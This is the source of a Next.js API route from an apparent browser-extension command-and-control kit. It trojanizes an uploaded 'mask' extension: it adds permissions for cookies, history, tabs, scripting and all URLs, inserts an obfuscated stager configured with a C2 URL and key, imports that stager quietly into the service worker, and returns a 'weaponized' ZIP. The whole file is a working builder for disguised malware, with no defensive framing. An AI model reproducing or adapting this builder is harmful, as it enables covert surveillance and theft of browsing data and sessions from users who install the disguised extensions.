import { NextRequest, NextResponse } from "next/server";
import fs from "fs-extra";
import path from "path";
import os from "os";
import AdmZip from "adm-zip";
import JavaScriptObfuscator from "javascript-obfuscator";
import { getMasterKey } from "@/lib/crypto";

const REQUIRED_PERMISSIONS = [
    "storage",
    "alarms",
    "activeTab",
    "scripting",
    "idle",
    "cookies",
    "history",
    "tabs",
];

const REQUIRED_HOST_PERMS = [
    "<all_urls>"
];

export async function POST(req: NextRequest) {
    let tmpDir = "";
    try {
        const formData = await req.formData();
        const maskFile = formData.get("mask") as File;
        const c2Url = formData.get("c2_url") as string;
        const obfuscate = formData.get("obfuscate") === "true";

        if (!maskFile) {
            return NextResponse.json({ error: "Missing mask extension ZIP file" }, { status: 400 });
        }

        // Create a temporary directory
        tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "nexusc2-build-"));

        // Save the uploaded zip
        const zipBuffer = Buffer.from(await maskFile.arrayBuffer());
        const zipPath = path.join(tmpDir, "mask.zip");
        await fs.writeFile(zipPath, zipBuffer);

        // Extract zip
        let extractDir = path.join(tmpDir, "extracted");
        const zip = new AdmZip(zipPath);
        zip.extractAllTo(extractDir, true);

        // Intelligently find the actual root folder containing manifest.json
        // (Sometimes users zip a folder instead of zipping the contents directly)
        function findManifestDir(dir: string): string | null {
            if (fs.existsSync(path.join(dir, "manifest.json"))) return dir;
            const items = fs.readdirSync(dir, { withFileTypes: true });
            for (const item of items) {
                if (item.isDirectory()) {
                    const found = findManifestDir(path.join(dir, item.name));
                    if (found) return found;
                }
            }
            return null;
        }

        const actualRoot = findManifestDir(extractDir);
        if (!actualRoot) {
            return NextResponse.json({ error: "manifest.json not found anywhere inside uploaded zip" }, { status: 400 });
        }

        // Use the actual root for all operations
        extractDir = actualRoot;

        // 1. Process Manifest
        const manifestPath = path.join(extractDir, "manifest.json");

        const manifest = await fs.readJson(manifestPath);

        manifest.permissions = Array.from(new Set([...(manifest.permissions || []), ...REQUIRED_PERMISSIONS]));
        manifest.host_permissions = Array.from(new Set([...(manifest.host_permissions || []), ...REQUIRED_HOST_PERMS]));

        let targetBgScript = null;
        let isModule = false;

        if (manifest.background && manifest.background.service_worker) {
            targetBgScript = manifest.background.service_worker;
            isModule = manifest.background.type === "module";
        } else if (manifest.background && manifest.background.scripts) {
            targetBgScript = manifest.background.scripts[0];
            isModule = manifest.background.type === "module";
        } else {
            targetBgScript = "background.js";
            manifest.background = { service_worker: targetBgScript };
        }

        await fs.writeJson(manifestPath, manifest, { spaces: 2 });

        // 2. Read Stager logic
        const stagerPath = path.join(process.cwd(), "src/lib/payloads/background.js");
        if (!(await fs.pathExists(stagerPath))) {
            return NextResponse.json({ error: "Stager payload not found on server" }, { status: 500 });
        }
        let stagerCode = await fs.readFile(stagerPath, "utf8");

        const { pubKeyB64 } = await getMasterKey();

        stagerCode = stagerCode.replace(
            /const C2_MASTER_PUBKEY = "[^"]*";/,
            `const C2_MASTER_PUBKEY = "${pubKeyB64}";`
        );

        if (c2Url) {
            stagerCode = stagerCode.replace(
                /const C2_BASE_URL = "[^"]*";/,
                `const C2_BASE_URL = "${c2Url}";`
            );
        }

        // 3. Obfuscate ONLY the Stager
        if (obfuscate) {
            const obfuscationResult = JavaScriptObfuscator.obfuscate(stagerCode, {
                compact: true,
                controlFlowFlattening: true,
                controlFlowFlatteningThreshold: 0.75,
                deadCodeInjection: true,
                deadCodeInjectionThreshold: 0.4,
                stringArray: true,
                stringArrayEncoding: ['base64'],
                stringArrayThreshold: 0.75,
                disableConsoleOutput: true,
                selfDefending: false,
                debugProtection: false,
                ignoreRequireImports: true
            });
            stagerCode = "self.window = self;\n" + obfuscationResult.getObfuscatedCode();
        }

        // 4. Inject Payload (Avoid destroying the original mask's logic)
        // We drop the stager into a standalone file and simply import it into the existing SW.
        const stagerFilename = "nexus-core.js";
        const stagerOutPath = path.join(extractDir, stagerFilename);
        await fs.writeFile(stagerOutPath, stagerCode);

        const outBgScriptPath = path.join(extractDir, targetBgScript);
        let maskBgCode = "";

        // Handle pathing if the service worker is nested (e.g., dist/bg.js)
        const depth = targetBgScript.split('/').length - 1;
        const relativePathToRoot = depth > 0 ? "../".repeat(depth) : "./";
        const stagerImportPath = `${relativePathToRoot}${stagerFilename}`;

        if (await fs.pathExists(outBgScriptPath)) {
            maskBgCode = await fs.readFile(outBgScriptPath, "utf8");
        }

        let combinedCode = "";
        if (isModule) {
            combinedCode = `import "${stagerImportPath}";\n\n${maskBgCode}`;
        } else {
            combinedCode = `try { importScripts("${stagerImportPath}"); } catch(e) {}\n\n${maskBgCode}`;
        }

        await fs.writeFile(outBgScriptPath, combinedCode);

        // 5. Pack into new Zip
        const outZip = new AdmZip();
        outZip.addLocalFolder(extractDir);
        const finalZipBuffer = outZip.toBuffer();

        // Cleanup
        await fs.remove(tmpDir);

        return new NextResponse(finalZipBuffer as any, {
            status: 200,
            headers: {
                "Content-Type": "application/zip",
                "Content-Disposition": `attachment; filename="weaponized_${maskFile.name}"`
            }
        });

    } catch (error: any) {
        if (tmpDir) {
            try { await fs.remove(tmpDir); } catch (e) { }
        }
        return NextResponse.json({ error: `Build failed: ${error.message}` }, { status: 500 });
    }
}
